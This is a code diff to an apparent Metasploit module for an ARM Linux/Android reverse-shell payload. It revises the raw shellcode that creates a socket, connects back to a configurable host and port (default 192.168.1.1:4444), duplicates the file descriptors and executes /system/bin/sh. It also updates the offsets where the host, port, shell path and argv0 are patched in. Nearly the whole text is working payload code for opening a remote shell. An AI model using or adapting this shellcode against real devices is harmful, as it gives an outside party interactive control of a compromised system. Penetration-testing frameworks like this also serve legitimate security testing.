@@ -30,8 +30,8 @@ module MetasploitModule
         {
           'Offsets' =>
             {
-              'LHOST'    => [ 136, 'ADDR' ],
-              'LPORT'    => [ 134, 'n' ],
+              'LHOST'    => [ 160, 'ADDR' ],
+              'LPORT'    => [ 158, 'n' ],
             },
           'Payload' =>
             [
@@ -47,19 +47,19 @@ module MetasploitModule
               # or root.
               ####
               # socket(2,1,6)
-              0xe3a00002,       # mov     r0, #2  ; 0x2
-              0xe3a01001,       # mov     r1, #1  ; 0x1
-              0xe2812005,       # add     r2, r1, #5      ; 0x5
-              0xe3a0708c,       # mov     r7, #140        ; 0x8c
-              0xe287708d,       # add     r7, r7, #141    ; 0x8d
+              0xe3a00002,       # mov     r0, #2       ; 0x2
+              0xe3a01001,       # mov     r1, #1       ; 0x1
+              0xe2812005,       # add     r2, r1, #5   ; 0x5
+              0xe3a0708c,       # mov     r7, #140     ; 0x8c
+              0xe287708d,       # add     r7, r7, #141 ; 0x8d
               0xef000000,       # svc     0x00000000
 
               # connect(soc, socaddr, 0x10)
               0xe1a06000,       # mov     r6, r0
-              0xe28f1060,       # 1dr     r1, pc, #96  ; 0x60
-              0xe3a02010,       # mov     r2, #16 ; 0x10
-              0xe3a0708d,       # mov     r7, #141        ; 0x8d
-              0xe287708e,       # add     r7, r7, #142    ; 0x8e
+              0xe28f1078,       # add     r1, pc, #120 ; 0x78
+              0xe3a02010,       # mov     r2, #16      ; 0x10
+              0xe3a0708d,       # mov     r7, #141     ; 0x8d
+              0xe287708e,       # add     r7, r7, #142 ; 0x8e
               0xef000000,       # svc     0x00000000
 
               # dup2(soc,0) @stdin
@@ -81,18 +81,30 @@ module MetasploitModule
               0xef000000,       # svc     0x00000000
 
               # execve("/system/bin/sh", args, env)
-              0xe28f0024,       # add     r0, pc, #36     ; 0x24
+              0xe28f003c,       # add     r0, pc, #60  ; 0x3c
+              # - make a zero
               0xe0244004,       # eor     r4, r4, r4
               0xe92d0010,       # push    {r4}
+              # - compute address of env
+              0xe28f3044,       # add     r3, pc, #68  ; 0x44
+              0xe92d0008,       # push    {r3}
               0xe1a0200d,       # mov     r2, sp
-              0xe28f4024,       # add     r4, pc, #36     ; 0x10
+              # - ensure another zero
+              0xe92d0010,       # push    {r4}
+              # - compute address of argv
+              0xe28f4030,       # add     r4, pc, #48  ; 0x30
               0xe92d0010,       # push    {r4}
               0xe1a0100d,       # mov     r1, sp
+              # - go execve!
               0xe3a0700b,       # mov     r7, #11 ; 0xb
               0xef000000,       # svc     0x00000000
 
+              0xef000000,       # svc     0x00000000
+              0xef000000,       # svc     0x00000000
+              0xef000000,       # svc     0x00000000
+
               # <af>:
-              # port offset = 134, ip offset = 136
+              # port offset = xx, ip offset = yy
               0x04290002,       # .word   0x5c110002 @ port: 4444 , sin_fam = 2
               0x0101a8c0,       # .word   0x0101a8c0 @ ip: 192.168.1.1
               # <shell>:
@@ -125,14 +137,14 @@ module MetasploitModule
     if sh.length >= 16
       raise ArgumentError, "The specified shell must be less than 16 bytes."
     end
-    p[140, sh.length] = sh
+    p[164, sh.length] = sh
 
     arg = datastore['ARGV0']
     if arg
       if arg.length >= 16
         raise ArgumentError, "The specified argv[0] must be less than 16 bytes."
       end
-      p[156, arg.length] = arg
+      p[180, arg.length] = arg
     end
 
     p
